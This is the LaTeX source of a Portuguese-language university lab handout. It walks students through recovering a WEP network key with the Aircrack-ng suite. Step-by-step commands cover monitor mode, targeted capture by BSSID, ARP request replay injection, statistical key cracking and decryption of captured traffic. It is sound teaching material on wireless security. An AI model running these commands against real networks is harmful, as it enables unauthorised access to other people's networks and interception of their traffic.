\title{Laboratório WEP}
\author{Prof. Gabriel Rodrigues Caldas de Aquino}
\date{Compilado em: \\ \today}

\begin{document}

\maketitle
\section*{Informações Gerais}

Este laboratório consiste na exploração prática das vulnerabilidades dos protocolos de segurança WEP, WPA e WPA2 discutidas em aula.

\textbf{Ferramental utilizado:}
\begin{itemize}
    \item \texttt{iwconfig}: Ferramenta nativa nos sistemas UNIX-like usada para verificar o estado e configurar interfaces de rede sem fio
    \item \texttt{Aircrack-NG}: Suite de ferramentas para auditoria em redes 802.11
    \begin{itemize}
        \item \texttt{airmon-ng}: Habilita e desabilita o modo “Monitor” nas interfaces de rede sem fio
        \item \texttt{airodump-ng}: Captura quadros 802.11 completos
        \item \texttt{aireplay-ng}: Injeta e reenvia quadros 802.11, além de implementar alguns ataques
        \item \texttt{airolib-ng}: Pré-computa chaves WPA ou WPA2 para agilizar quebra por força bruta
        \item \texttt{aircrack-ng}: Quebra chaves WEP e WPA/WPA2 no modo pessoal
        \item \texttt{airdecap-ng}: Decodifica arquivos de captura codificados com WEP, WPA ou WPA2
    \end{itemize}
\end{itemize}

\section*{Parte I: Exploração do ataque estatístico sobre redes 802.11 com WEP}

\textbf{Objetivo:} Recuperar a chave de uma rede 802.11 que utiliza WEP \cite{vibhuti2005ieee}.  

\textbf{Tempo previsto:} 45 minutos  

A técnica utilizada foi publicada em \cite{Fluhrer2001} e estendida em \cite{Tews2007}. Ela explora falhas intrínsecas do RC4 (como repetição de IVs) e falhas de implementação (como correlação entre bits da chave WEP e o primeiro byte de todos os IVs).

\subsection*{Procedimentos}

\textbf{Passo 1: Configurar a interface no modo “Monitor”}
\begin{itemize}
    \item \textbf{Ferramentas:} \texttt{airmon-ng}, \texttt{iwconfig}
    \item airmon-ng start wlan0: Coloca a interface wlan0 em modo “Monitor”
 \item iwconfig :Checa se a interface foi colocada em modo monitoração
É possível que uma interface virtual seja criada em modo monitor

    \item \textbf{Comandos:}
    \begin{verbatim}
    airmon-ng start wlan0
    iwconfig
    \end{verbatim}
\end{itemize}

\textbf{Passo 2: Capturar quadros da rede alvo}
\begin{itemize}
    \item \textbf{Ferramentas:} \texttt{airodump-ng}
 \item airodump-ng mon0
 \begin{itemize}
     \item Mostra todas as redes sem fio no alcance
     \item Obtem as seguintes informações:
     \item BSSID do AP,
     \item Canal em que a rede está operando,
     \item Endereço MAC de um cliente ativo na rede (preferência para um que esteja gerando muito tráfego).
 \end{itemize}
\item airodump-ng --channel [CHANNEL] --bssid [BSSID] -w [PREFFIX] mon0: 
\begin{itemize}
    \item Captura de quadros específica da rede sem fio alvo 
    \item -w [PREFIX]: significa que você vai passar um prefixo de arquivo para salvar ou carregar
\end{itemize}



    
    \item \textbf{Comandos:}
    \begin{verbatim}
    airodump-ng mon0
    airodump-ng --channel [CHANNEL] --bssid [BSSID] -w [PREFFIX] mon0
    \end{verbatim}
\end{itemize}

\textbf{Passo 3: Acelerar geração de IVs}
\begin{itemize}
    \item \textbf{Ferramentas:} \texttt{aireplay-ng}
    \item Executa o ataque 3 da ferramenta aireplay-ng
        \item o ARP Request Replay Attack
Reenvia quadros “ARP Request” capturados vindos do MAC especificado
   \item Cada quadro “ARP Request” provoca um “ARP Response” com um novo IV

    \item \textbf{Comando:}
    \begin{verbatim}
    aireplay-ng -3 -b [BSSID] -m [MAC] mon0
    \end{verbatim}
\end{itemize}

\textbf{Passo 4: Recuperar a chave WEP}
\begin{itemize}
    \item \textbf{Ferramentas:} \texttt{aircrack-ng}
    \item Especifica que o ataque de \cite{Tews2007} deve ser executado antes do de \cite{Fluhrer2001}
    \item Procura repetição de IVs no arquivo de captura passado como parâmetro
    \item Exibe a chave WEP recuperada

    \item \textbf{Comando:}
    \begin{verbatim}
    aircrack-ng -P 2 [PREFFIX]-01.cap
    \end{verbatim}
\end{itemize}

\textbf{Passo 5: Decodificar o arquivo de captura}
\begin{itemize}
    \item \textbf{Ferramentas:} \texttt{airdecap-ng}
    \item \textbf{Comando:}
    \begin{verbatim}
    airdecap-ng -w [CHAVE] [PREFFIX]-01.cap
    \end{verbatim}
\end{itemize}

\bibliographystyle{plain}
    \bibliography{bib}

\end{document}